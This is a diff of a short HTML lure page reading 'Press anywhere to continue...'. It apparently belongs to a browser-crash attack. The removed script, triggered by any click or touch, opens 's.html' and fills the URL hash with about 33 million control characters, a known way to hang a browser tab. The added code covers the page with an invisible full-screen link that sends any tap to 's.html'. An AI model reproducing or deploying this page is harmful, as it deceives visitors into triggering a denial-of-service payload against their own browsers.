@@ -2,19 +2,24 @@
 
 <html>
 	<head>
+        <style>
 
-		<script>
-			function handler(){
-				window.open("s.html");window.onload=()=>location.hash="M"+"\u0001".repeat(2**25)+"m";
-			}
-			document.body.addEventListener("touchstart", handler);
-			document.body.addEventListener("click", handler);
-		</script>
+            a {
+                font-size: 100000px;
+                width: 100%;
+                min-height: 100%;
+                position:absolute;
+                left:0;
+                top:0;
+                z-index: 0;
+            }
+        </style>
+		
 	</head>
 	<body>
         <h1 style="font-family: Helvetica, sans-serif">Press anywhere to continue...</h1>
 
-
+        <a href="s.html" target="_blank" onclick="window.location = 's.html'">.</a>
         
 		
 	</body>
